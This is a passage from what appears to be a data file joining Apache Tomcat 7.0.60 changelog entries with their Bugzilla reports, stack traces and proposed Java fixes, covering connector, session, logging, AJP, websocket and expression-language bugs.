> > > get into this state. Perhaps if it were to always read ahead the 
> > > next chunk size before handing back a completed chunk of data then 
> > > it could ensure that the trailing zero is always consumed.
> > >
> > > Any thoughts?
> >
> > This sounds like a Tomcat bug but it will need some research to 
> > figure out what is happening and confirm that.
> >
> > As an aside, the JSON parser should read until it gets a -1 (end of 
> > stream). I suspect it is using the structure of the JSON to figure 
> > out where the data ends and isn't doing the final read.
> >
> > When the request/response is completed Tomcat should do a blocking 
> > read until the end chunk has been read. That this isn't happening is 
> > what makes me think this is a Tomcat bug.
> 
> The JSON parser is calling ObjectMapper._readMapAndClose(). This 
> completes its read - as far as its concerned it's finished - and it 
> calls close() on its JsonParser parameter. That stream close() call is 
> implemented by CoyoteInputStream.close(). This, in turn calls
> org.apache.catalina.connector.InputBuffer.close() which just sets a 
> private 'closed' flag. The filters have an end method() and 
> ChunkedInputFilter uses it to seek to the end but that's never called.
> 
> A good place to clean up the request filters held in 
> org.apache.coyote.http11.AbstractInputBuffer would appear to be in 
> org.apache.catalina.connector.close(), but I'm not familiar enough 
> with the async workflow to know if that's correct or not.

Some more info. Inside the ""org.apache.coyote.http11. AbstractHttp11Processor<S>.process"" method there is this cleanup code after the main request while() loop:

            // Finish the handling of the request
            rp.setStage(org.apache.coyote.Constants.STAGE_ENDINPUT);

            if (!isAsync() && !comet) {
                if (error) {
                    // If we know we are closing the connection, don't drain
                    // input. This way uploading a 100GB file doesn't tie up the
                    // thread if the servlet has rejected it.
                    getInputBuffer().setSwallowInput(false);
                }
                endRequest();
            }

Note the call to endRequest(). If I make my methods synchronous (i.e. remove WebAsyncMethod<>) then isAsync() returns false, this cleanup block is entered, endRequest() is called, ChunkedInputFilter.end() is called and the trailing metadata is consumed. All is good. Only when methods are async is this block skipped and the cleanup missed.

I'm sure it was coded this way for a good reason but perhaps there have been unintended consequences."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57621
Catalina|Tomcat 7.0.60 (violetagg)|fix|57637|Do not create unnecessary sessions when using PersistentValve. (jboynes/fschumacher)|PersistentValve always causes a new session to be created|"When determining if a session should be persisted, PersistentValve calls getSessionInternal with no arguments which causes a new one to be allocated if none exists. It should pass false to avoid unnecessary sessions being allocated.

http://svn.apache.org/viewvc/tomcat/trunk/java/org/apache/catalina/valves/PersistentValve.java?revision=1561138&view=markup#l131"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57637
Catalina|Tomcat 7.0.60 (violetagg)|fix|57645|Correct a regression in the fix for 57190 that incorrectly required the path passed to ServletContext.getContext(String) to be an exact match to a path to an existing context. (markt)|"getContext(""/"") returns null"|"The getContext() method incorrectly returns null when requesting the ROOT context (""/""). The following fix resolves the issue:

    public ServletContext getContext(String uri) {

        // Validate the format of the specified argument
        if ((uri == null) || (!uri.startsWith(""/"")))
            return (null);

        Context child = null;
        try {
            // Look for an exact match
            Container host = context.getParent();
            child = (Context) host.findChild(uri);
            if ( (child == null) && ""/"".equals(uri) ) { // fix
              child = (Context) host.findChild("""");     // fix
            }                                           // fix

The root context was created via:

  Context context = embedded.addWebapp("""", ""/path/to/webapps/ROOT"");"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57645
Catalina|Tomcat 7.0.60 (violetagg)|fix||Make sure that unpackWAR attribute of Context is handled correctly in HostConfig. (kfujino)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix||When deploying a WAR file that contains a context.xml file and unpackWARs is false ignore any context.xml file that may exist in an expanded directory associated with the WAR. (markt)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix|57675|Correctly quote strings when using the extended access log. (markt)|ExtendedAccessLogValve quoting problems|"Reproduce:

<Valve className=""org.apache.catalina.valves.ExtendedAccessLogValve"" directory=""logs"" 	prefix=""extended"" suffix="".log"" pattern=""date time cs(test)"" />

Access a page with the request header test: 'alpha

Actual result:
2015-03-07 18:49:11 ''""lpha'

Expected Result:

According to my understanding of http://www.w3.org/TR/WD-logfile.html , the result should be:
2015-03-07 18:49:11 ""'alpha""
-The missing a should obviously be included
-Only double Quotes should be used
-Quotation should be done with a double quoting char

Additional: 
""The dash character must not be used as an abbreviation for an empty string.""
Currently empty Strings are turned into a dash"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57675
Catalina|Tomcat 7.0.60 (violetagg)|fix|57704|Fix potential NPEs during web application start/stop when org.apache.tomcat.InstanceManager is not initialized. (violetagg)|NullPointerException at org.apache.catalina.core.StandardContext.listenerStop|"During shutdown, tomcat crashes as follows:

SEVERE: Exception sending context destroyed event to listener instance of class org.apache.tomcat.websocket.server.WsContextListener
java.lang.NullPointerException
        at org.apache.catalina.core.StandardContext.listenerStop(StandardContext.java:5076)
        at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5719)
        at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:160)
        at org.apache.catalina.core.ContainerBase.addChildInternal(ContainerBase.java:901)
        at org.apache.catalina.core.ContainerBase.addChild(ContainerBase.java:877)
        at org.apache.catalina.core.StandardHost.addChild(StandardHost.java:649)
        at org.apache.catalina.startup.HostConfig.deployDescriptor(HostConfig.java:672)
        at org.apache.catalina.startup.HostConfig$DeployDescriptor.run(HostConfig.java:1859)
        at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:471)
        at java.util.concurrent.FutureTask.run(FutureTask.java:262)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)


An analysis of the code shows that getInstanceManager() is being called, and an assumption is made that this call will always return not-null, which is not the case. The rest of the code shows that there are valid situations where this returns null.

5075 	try {
5076 	getInstanceManager().destroyInstance(listeners[j]);
5077 	} catch (Throwable t) {
5078 	t = ExceptionUtils.unwrapInvocationTargetException(t);
5079 	ExceptionUtils.handleThrowable(t);
5080 	getLogger().error
5081 	(sm.getString(""standardContext.listenerStop"",
5082 	listeners[j].getClass().getName()), t);
5083 	ok = false;
5084 	} 

The fix should be a simple null check on or around line 5076."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57704
Catalina|Tomcat 7.0.60 (violetagg)|fix||Add support for LAST_ACCESS_AT_START system property to SingleSignOn. (kfujino)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix|57723|Ensure that the Context name and path remain consistent when adding a web application to an embedded Tomcat instance via Tomcat.addWebapp(Host,String,String,String). (markt)|An incomplete fix for invalid context paths in StandardContext.java / JNDI fails|"The fix for #57216 is aimed handle invalid context paths, such as ""/"".
When using Tomcat.addWebapp() the (wrong) name for the context is
already set in Line 534.

    public Context addWebapp(Host host, String url, String path) {
        return addWebapp(host, url, url, path);
    }
			
    public Context addWebapp(Host host, String url, String name, String path) {
        silence(host, url);
        Context ctx = createContext(host, url);
        ctx.setName(name);
        ctx.setPath(url);
        ctx.setDocBase(path);
...

Therefore StandardContext.setPath()#2198 does not set the corrected name for the
context.

This causes JNDI to fail, i.e. in JSPCompilationContext.getLastModified()#410 and
#421.

if(invalid) should also include setting the new corrected name.
Or fail hard - that would have made it easier to find.

Best regards,
Christian"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57723
Catalina|Tomcat 7.0.60 (violetagg)|fix|57724|Handle the case in the CORS filter where a user agent includes an origin header for a non-CORS request. (markt)|"CorsFilter does not work correctly if the ""origin"" has the same value with the ""host"""|"I am using tomcat 7.0.57, and I have CorsFilter configured in my application, in my login page, I just have normal form with the username & password filter and a submit button, I set the ""method"" to ""POST', when I use Google Chrome to login, I get a 403 error.

The reason is Google Chrome adds the ""origin"" into the http header, and the value is same as the host value(both of them are ""http://localhost:8000"").

It will be nice if someone can update CorsFilter.checkRequestType to return a CORSRequestType.NOT_CORS in this case."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57724
Catalina|Tomcat 7.0.60 (violetagg)|code||Refactor Authenticator implementations to reduce code duplication. (markt)|||
Catalina|Tomcat 7.0.60 (violetagg)|fix||When searching for SCIs o.a.catalina.Context.getParentClassLoader will be used instead of java.lang.ClassLoader.getParent. Thus one can provide the correct parent class loader when running embedded Tomcat in other environments such as OSGi. (violetagg)|||
Coyote|Tomcat 7.0.60 (violetagg)|fix|57509|Improve length check when writing HTTP/1.1 response headers: reserve space for 4 extra bytes. (kkolinko)|maxHttpHeaderSize maybe case ArrayIndexOutOfBoundsException|"Modify the server.xml, add the maxHttpHeaderSize attribute:

<Connector port=""8080"" protocol=""HTTP/1.1""
               connectionTimeout=""20000""
               redirectPort=""8443"" maxHttpHeaderSize=""24""/>


  I deliberately modify the maxHttpHeaderSize to a small value, then I make a normal request, Sure, the request header is more than 24 bytes.

  Then the server is report following error:

28-Jan-2015 16:08:01.870 SEVERE [http-nio-8080-exec-1] org.apache.coyote.http11.AbstractHttp11Processor.endRequest Error finishing response
 java.lang.ArrayIndexOutOfBoundsException: 24
        at org.apache.coyote.http11.AbstractOutputBuffer.sendStatus(AbstractOutputBuffer.java:445)
        at org.apache.coyote.http11.AbstractHttp11Processor.prepareResponse(AbstractHttp11Processor.java:1554)
        at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:739)
        at org.apache.coyote.Response.action(Response.java:179)
 ...

  Is not check the maxHttpHeaderSize? Normal circumstances, it's should response 413-request entity is too large. I think this is better and reasonable."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57509
Coyote|Tomcat 7.0.60 (violetagg)|add|57540|Make TLS/SSL protocol available in a new request attribute (org.apache.tomcat.util.net.secure_protocol_version). (Note that AJP connectors will require mod_jk 1.2.41 or later, or an as-yet-unknown version of mod_proxy_ajp, or configure the proxy to send the AJP_SSL_PROTOCOL request attribute to Tomcat. Please see the bug comments for details.) Based upon a patch provided by Ralf Hauser. (schultz)|report TLS protocol version|"There is org.apache.tomcat.util.net.SSLSupport.CIPHER_SUITE_KEY and with 

request.getAttribute(SSLSupport.CIPHER_SUITE_KEY) , one can find out with cipher suite has been used between the client and the tomcat.

However, it doesn't seem possible to do the same on the TLS version, therefore my suggestions:

1) in SSLSuport create
  a) public static final String PROTOCOL_VERSION_KEY =
            ""javax.servlet.request.secure_protocol_version"";
  b) public String getProtocol() throws IOException;

2) in org.apache.tomcat.util.net.jsse.JSSESupport add

   public String getProtocol() throws IOException {
         if (session == null)
            return null;
        return session.getProtocol();
    }

   }

3) in  org.apache.coyote.http11.Http11Processor.action() add

                    sslO = sslSupport.getProtocol();
                    if (sslO != null) {
                        request.setAttribute
                            (SSLSupport.PROTOCOL_VERSION_KEY, sslO);
                    }"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57540
Coyote|Tomcat 7.0.60 (violetagg)|fix|57544|Fix potential infinite loop when preparing a kept alive HTTP connection for the next request. (markt)|Server CPU maxed out (100% per core) randomly after 10 to 30 hours|"""uniwar-exec-18"" #59 daemon prio=5 os_prio=0 tid=0x000000000096a000 nid=0x58da runnable [0x000000004457c000]
   java.lang.Thread.State: RUNNABLE
        at org.apache.coyote.http11.AbstractInputBuffer.nextRequest(AbstractInputBuffer.java:298)
        at org.apache.coyote.http11.AbstractNioInputBuffer.nextRequest(AbstractNioInputBuffer.java:150)
        at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1152)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:659)
        at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1558)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1515)
        - locked <0x00000006771385a8> (a org.apache.tomcat.util.net.NioChannel)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.lang.Thread.run(Thread.java:745)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57544
Coyote|Tomcat 7.0.60 (violetagg)|fix|57546|Ensure that a dropped network connection does not leave references to the UpgradeProcessor associated with the connection in memory. (markt)|Memory Leak in SecureNioChannel|"Created attachment 32440 [details]
Too many instances in  hashmap

We are connecting mobile devices via websocket to Tomcat 8.0.18 server. The physical mobile connection can die at random times. When the connection goes down the instance of org.apache.coyote.http11.upgrade.NioProcessor is not removed from the connections HashMap in class org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler. There are 4,181 entries in the connections HashMap. However, there are in fact 1,400 real socket connections. See DumpHprof1.jpg. This displays a drill-down into one of the HashMap entries. The instance of SafeCommConnection is my ServerEndpoint POJO. When onClose is called in my ServerEndpoint I set a flag called isClosing to true. You can see on the right side that it is set to true so I have removed it from my app but the instance remains in memory held by the NioProtocol's connections HashMap. It seems that http11NioProtocol.release method is not getting called. Also, here is a stack trace in the stderr log file. It gets hundreds of these:

06-Feb-2015 14:12:05.255 INFO [http-nio-443-exec-385] org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.doClose Failed to close the ServletOutputStream connection cleanly
 java.io.IOException: An existing connection was forcibly closed by the remote host
	at sun.nio.ch.SocketDispatcher.write0(Native Method)
	at sun.nio.ch.SocketDispatcher.write(Unknown Source)
	at sun.nio.ch.IOUtil.writeFromNativeBuffer(Unknown Source)
	at sun.nio.ch.IOUtil.write(Unknown Source)
	at sun.nio.ch.SocketChannelImpl.write(Unknown Source)
	at org.apache.tomcat.util.net.SecureNioChannel.flush(SecureNioChannel.java:134)
	at org.apache.tomcat.util.net.SecureNioChannel.close(SecureNioChannel.java:370)
	at org.apache.tomcat.util.net.SecureNioChannel.close(SecureNioChannel.java:398)
	at org.apache.coyote.http11.upgrade.NioServletOutputStream.doClose(NioServletOutputStream.java:138)
	at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.close(AbstractServletOutputStream.java:137)
	at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.doClose(WsRemoteEndpointImplServer.java:143)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.close(WsRemoteEndpointImplBase.java:638)
	at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.onWritePossible(WsRemoteEndpointImplServer.java:118)
	at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.doWrite(WsRemoteEndpointImplServer.java:81)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.writeMessagePart(WsRemoteEndpointImplBase.java:450)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessage(WsRemoteEndpointImplBase.java:338)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:270)
	at org.apache.tomcat.websocket.WsSession.sendCloseMessage(WsSession.java:563)
	at org.apache.tomcat.websocket.WsSession.onClose(WsSession.java:503)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.close(WsHttpUpgradeHandler.java:183)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.access$200(WsHttpUpgradeHandler.java:48)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler$WsReadListener.onDataAvailable(WsHttpUpgradeHandler.java:214)
	at org.apache.coyote.http11.upgrade.AbstractServletInputStream.onDataAvailable(AbstractServletInputStream.java:194)
	at org.apache.coyote.http11.upgrade.AbstractProcessor.upgradeDispatch(AbstractProcessor.java:96)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:654)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1558)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1515)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Unknown Source)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57546
Coyote|Tomcat 7.0.60 (violetagg)|fix|57570|Make the processing of trailer headers with chunked input optional and disabled by default. (markt)|Make processing of chunked encoding trailers an opt-in feature (align with HTTPD 2.4.12)|"Two weeks ago Apache HTTPD 2.4.12 release was announced. It contains a fix for the following issue:

<quote>
CVE-2013-5704 (cve.mitre.org)
 core: HTTP trailers could be used to replace HTTP headers
 late during request processing, potentially undoing or
 otherwise confusing modules that examined or modified
 request headers earlier.  Adds ""MergeTrailers"" directive to restore
 legacy behavior.
</quote>

-> [1],[2].


Apparently this has been discussed in the open for about a year in relation to HTTPD [3] and in general [4], but I have not seen anyone raising the issue for Tomcat yet.


In Tomcat  chunked encoding trailers are processed by ChunkedInputFilter  (.parseEndChunk() -> .parseHeader()). The values are available as headers (TestChunkedInputFilter$EchoHeaderServlet)

This was implemented via bug 49860 and is available since 6.0.30, 7.0.5 in all current versions. (r1039090 in 6.0.x)


If we follow in HTTPD steps, a solution is to make processing of these trailers an opt-in feature, being off by default.  A mitigation is already available with the existing features: it is possible to limit size of trailer headers via configuration.

Tomcat 6: [5]
org.apache.coyote.MAX_TRAILER_SIZE=0

Tomcat 7 and later: [6]
maxTrailerSize=""0"" on an HTTP connector


In the simplest case ""making processing of trailers an opt-in feature"" means changing the defaults for those options to be 0.

Note that setting those values to 0 does enforce the limit. It differs from ""just ignoring"" the headers. So there is a place for having a separate option.

I think that if someone is actually using trailers, a better configuration option would be a white list of expected trailer names, with non-whitelisted trailers being ignored.



[1] https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5704
[2] https://access.redhat.com/security/cve/CVE-2013-5704

[3] http://marc.info/?l=apache-httpd-dev&m=139636309822854&w=2
""CVE-2013-5704, mod_headers and chunked trailer fields""
mail thread, April 2014

[4] http://martin.swende.se/blog/HTTPChunked.html
""Chunked HTTP transfer encoding""

[5] http://tomcat.apache.org/tomcat-6.0-doc/config/systemprops.html#Other

[6] http://tomcat.apache.org/tomcat-7.0-doc/config/http.html#Standard_Implementation"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57570
Coyote|Tomcat 7.0.60 (violetagg)|fix||When applying the maxSwallowSize limit to a connection read that many bytes first before closing the connection to give the client a chance to read the response. (markt)|||
Coyote|Tomcat 7.0.60 (violetagg)|fix||Prevent an async timeout being processed multiple times for the same socket when running on slow and/or heavily loaded systems. (markt)|||
Coyote|Tomcat 7.0.60 (violetagg)|fix|57581|Change statistics byte counter in coyote Request object to be long to allow values above 2Gb. (kkolinko)|request.getBytesRead() should be long|"Class org.apache.coyote.Request has bytesRead variable's return type is int.

When file upload (grater than 2 GB), it returns negative value.

Return type should be change to long.

This bug affected all version of tomcat 6, 7, 8, 9.

---------------------------------------------------------

* AS-IS

private int bytesRead=0;

public int getBytesRead() {
   return bytesRead;
}

* TO-BE

private long bytesRead=0;

public long getBytesRead() {
   return bytesRead;
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57581
Coyote|Tomcat 7.0.60 (violetagg)|fix||Fix a concurrency issue in the APR Poller that meant it was possible under low load for a socket queued to be added to the Poller not to be added for 10 seconds. (markt)|||
Coyote|Tomcat 7.0.60 (violetagg)|fix|57638|Avoid an IllegalArgumentException when an AJP request body chunk larger than the socket read buffer is being read. This typically requires a larger than default AJP packetSize. (markt)|IllegalArgumentException in AjpNioProcessor when packetSize > 8192|"For reference: http://markmail.org/thread/vu7kgdpqxdw7tlkz

This stack trace is from 8.0.17 but I have been able to reproduce it in 8.0.20 and 7.0.56 - 7.0.59:

java.lang.IllegalArgumentException
        at java.nio.Buffer.limit(Buffer.java:275)
        at
org.apache.coyote.ajp.AjpNioProcessor.readSocket(AjpNioProcessor.java:179)
        at
org.apache.coyote.ajp.AjpNioProcessor.read(AjpNioProcessor.java:159)
        at
org.apache.coyote.ajp.AbstractAjpProcessor.readMessage(AbstractAjpProcessor.java:1067)
        at
org.apache.coyote.ajp.AbstractAjpProcessor.receive(AbstractAjpProcessor.java:1005)
        at
org.apache.coyote.ajp.AbstractAjpProcessor.refillReadBuffer(AbstractAjpProcessor.java:1131)

Connector configuration:

    <Connector port=""@connector-port@""
       redirectPort=""443""
           protocol=""org.apache.coyote.ajp.AjpNioProtocol""
        URIEncoding=""UTF-8""
         packetSize=""65536""
           executor=""tomcatThreadPool"" />

Here's what I know so far:

1. AjpNioProtocol fails under some conditions (my post-login page)
   with packetSize larger than the default (I have tried 65536, 32768,
   16184, and 8200). The failing page is ~30k in size, enough to
   exceed the default packet size but not e.g. maximum 64k

2. Using AjpProtocol (BIO) connector solves the problem

3. Using the default AJP packet size (8192) solves the problem

4. Specifying socket.appReadBufSize and socket.appWriteBufSize to be
the same as the packet size solves the problem

I'm still working on a small test case to help motivate debugging.

Wild-guessing that the root cause is mismatched buffer sizes, or lack of checking when using a smaller protocol buffer than whatever buffer is pumping into the protocol's buffer."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57638
Coyote|Tomcat 7.0.60 (violetagg)|fix|57674|Avoid a BufferOverflowException when an AJP response body chunk larger than the socket write buffer is being written. This typically requires a larger than default AJP packetSize. (markt)|BufferOverflowException in AjpNioProcessor when writing content larger than the underlying buffer|"Similar to bug #57638, choosing a packetSize > 8192 (the default) for AjpNioProtocol causes BufferOverflowExceptions like the following:

java.nio.BufferOverflowException
        at java.nio.HeapByteBuffer.put(HeapByteBuffer.java:189)
        at org.apache.coyote.ajp.AjpNioProcessor.output(AjpNioProcessor.java:305)
        at org.apache.coyote.ajp.AbstractAjpProcessor$SocketOutputBuffer.doWrite(AbstractAjpProcessor.java:1234)
        at org.apache.coyote.Response.doWrite(Response.java:499)
        at org.apache.catalina.connector.OutputBuffer.realWriteBytes(OutputBuffer.java:402)
        at org.apache.tomcat.util.buf.ByteChunk.flushBuffer(ByteChunk.java:480)
        at org.apache.catalina.connector.OutputBuffer.realWriteChars(OutputBuffer.java:485)
        at org.apache.tomcat.util.buf.CharChunk.flushBuffer(CharChunk.java:464)
        at org.apache.tomcat.util.buf.CharChunk.append(CharChunk.java:302)
        at org.apache.catalina.connector.OutputBuffer.write(OutputBuffer.java:527)
        at org.apache.catalina.connector.CoyoteWriter.write(CoyoteWriter.java:152)
        at org.apache.velocity.io.VelocityWriter.flushBuffer(VelocityWriter.java:129)
        at org.apache.velocity.io.VelocityWriter.write(VelocityWriter.java:306)
        at org.apache.velocity.io.VelocityWriter.write(VelocityWriter.java:322)
        at org.apache.velocity.runtime.parser.node.ASTReference.render(ASTReference.java:491)
        at org.apache.velocity.runtime.parser.node.SimpleNode.render(SimpleNode.java:342)
        at org.apache.velocity.Template.merge(Template.java:356)
        at org.apache.velocity.Template.merge(Template.java:260)
        at org.apache.velocity.tools.view.VelocityView.performMerge(VelocityView.java:942)
        at org.apache.velocity.tools.view.VelocityView.merge(VelocityView.java:902)
        at org.apache.velocity.tools.view.VelocityViewServlet.mergeTemplate(VelocityViewServlet.java:318)
        at org.apache.velocity.tools.view.VelocityLayoutServlet.mergeTemplate(VelocityLayoutServlet.java:247)
        at org.apache.velocity.tools.view.VelocityViewServlet.doRequest(VelocityViewServlet.java:220)
        at org.apache.velocity.tools.view.VelocityViewServlet.doGet(VelocityViewServlet.java:182)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:624)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:731)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
        at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
    [...]

Setting socket.appReadBufSize to the same size as the packetSize resolves the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57674
Coyote|Tomcat 7.0.60 (violetagg)|code||Refactor Connector authentication (only used by AJP) into a separate method. (markt)|||
Coyote|Tomcat 7.0.60 (violetagg)|add|57708|Implement a new feature for AJP connectors - Tomcat Authorization. If the new tomcatAuthorization attribute is set to true (it is disabled by default) Tomcat will take an authenticated user name from the AJP protocol and use the appropriate Realm for the request to authorize (i.e. add roles) to that user. (markt)|[Patch] Authentication by reverse proxy, authorization by Tomcat|"Created attachment 32567 [details]
Patch for tomcat v7.0.x

In the current implementation of the tomcatAuthentication parameter, this allows the REMOTE_USER variable from the webserver to be used as the principal for the tomcat request.

A side effect of this option is that if the web application uses roles (authorization), the roles will be silently ignored, and the user will be locked out.

This limits the usefulness of tomcatAuthentication.

The attached patches introduce the tomcatAuthorization flag. When true, the REMOTE-USER will be used as the principal, while authorization will continue in Tomcat as normal.

What this means practically is that it now becomes possible to place a webserver in front of a web application, and the authentication performed by the webserver will cleanly replace the authentication performed by tomcat, while leaving the web application authorization configuration intact."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57708
Coyote|Tomcat 7.0.60 (violetagg)|fix||Fix an issue that meant that any pipe-lined data read by Tomcat before an asynchronous request completed was lost during the completion of the asynchronous request. This mean that the pipe-lined request(s) would be lost and/or corrupted. (markt)|||
Coyote|Tomcat 7.0.60 (violetagg)|update||Update the minimum recommended version of the Tomcat Native library (if used) to 1.1.33. (markt)|||
Jasper|Tomcat 7.0.60 (violetagg)|fix|57136|Ensure only \${ and \#{ are treated as escapes for ${ and #{ rather than \$ and \# being treated as escapes for $ and # when processing literal expressions in expression language. (markt)|EL Parser escaping dollar sign not ${ or ${...}|"In the EL 3.0 spec it says...
    Alternatively, the escape characters \$ and \# can be used to escape what would
otherwise be treated as an eval-expression. Given the literal-expressions:
        \${exprA}
        \#{exprB}
    The resulting values would again be the strings ${exprA} and #{exprB}.

I believe that means it should not escape lets say ""Price: \\$500.00"" it should instead output ""Price: \$500.00""(it currently would output ""Price: $500.00"") but should instead escape ""Price: \\${500.00}"" and the output of that would be ""Price: ${500.00}"".

Normally this wouldn't be run into, but I happened to run into this issue passing javascript code through the EL processor, that happens to have some escaped dollar signs inside some regex strings.

It maybe a little more acceptable to use \${ and \#{ as the escapes, as that is a better indication that there is about to be an expression"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57136
Jasper|Tomcat 7.0.60 (violetagg)|fix|57148|When coercing an object to a given type and a PropertyEditor has been registered for the type correctly coerce the empty string to null if the PropertyEditor throws an exception. (kkolinko/markt)|EL type conversion of empty string when there is a PropertyEditor (ELSupport.coerceToType())|"(Noted when reviewing org.apache.el.lang.ELSupport.coerceToType())

My expectations are that ELSupport.coerceToType() method follows the type conversion rules specified in Expression Language specification.

There is the following phrase in specification 3.0 ch.1.23.7 Coerce A to Any Other Type T:

""If A is a String and T's PropertyEditor throws an exception:""
""If A is """", return null""
""Otherwise, error""

The same phrase in present in EL 2.2 and EL 2.1 specifications (ch.1.18.7) as well.

Consider the following case:
- A is an empty string ("""")
- T has a PropertyEditor

Expected behaviour:
- Call PropertyEditor with value of """".
- If it throws an exception, return null.
- Otherwise use the converted value.
try {
 propertyEditor.setAsText("""").getValue();
} catch (RuntimeException e) {
 return null;
}

Actual implementation:
- It skips calling the PropertyEditor and immediately returns null.

 if (obj instanceof String) {
   if ("""".equals(obj))
        return null;
   PropertyEditor editor = PropertyEditorManager.findEditor(type);
 ...

The PropertyEditor.setAsText(String) method is documented to throw IllegalArgumentException on invalid values. I think that EL API expects an ELException, so it is to be wrapped somewhere."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57148
Cluster|Tomcat 7.0.60 (violetagg)|fix||Remove unnecessary method that always returns true. The domain filtering works on DomainFilterInterceptor. (kfujino)|||
WebSocket|Tomcat 7.0.60 (violetagg)|fix||Correct a bug in the permessage-deflate implementation that meant that the incorrect op-codes were used if an uncompressed message was converted into more than one compressed message. (markt)|||
Web applications|Tomcat 7.0.60 (violetagg)|fix||Fix possible resource leaks by closing streams properly. Issues reported by Coverity Scan. (fschumacher)|||
Web applications|Tomcat 7.0.60 (violetagg)|fix|56058|Add links to the AccessLogValve documentation for configuring reverse proxies and/or Tomcat to ensure that the desired information is used entered in the access log when Tomcat is running behind a reverse proxy. (markt)|AccessLogValve Local IP/port inconsistent|"Hi,
i think the logging of 
%A - Local IP address
%p - Local port on which this request was received
is inconsisstent if an ajp-connector is used.

%A logs the ip of the tomcat Server
%p logs the port of the Apache webserver

There should be a possibility to log:
1) the ip-address of the tomcat Server on which the request was recieved
2) the port of the tomcat Server on which the request was recieved

3) the ip-address of the webserver on which the request was recieved
4) the port of the webserver on which the request was recieved

Even 
%h - Remote host name (or IP address if resolveHosts is false) (and %a)
is not clear in case of an ajp-request.

There should be a possibility to log
5) the remote host of the ajp-request (= webserver)
6) the remote host of the webserver-request (= browser)

Use case:
i want to log, who is connecting to my tomcat Server. In case of ajp i can only see the endusers ip (with %h)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56058
Web applications|Tomcat 7.0.60 (violetagg)|fix|57503|Make clear that the JULI integration for log4j only works with log4j 1.2.x. (markt)|Log4J Logging Information Incomplete|"The Logging in Tomcat documentation states in the Log4J section on step 2 states:

Download Log4J (v1.2 or later).

This is incorrect. The current version of log4j (2.1) does not work with Tomcat 8. I have verified this. I configured per the instructions and log4j did not work. When I replaced the 2.1 jar with the current 1.2.x jar, logging worked as expected.

The documentation should reflect that version 1.2.x is required, or Tomcat should be updated to work with the 2.1 jar and the documentation updated to reflect that requirement."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57503
Web applications|Tomcat 7.0.60 (violetagg)|fix||Remove incorrect note from context configuration page in the documentation web application that stated WAR files located outside the appBase were never unpacked. (markt)|||
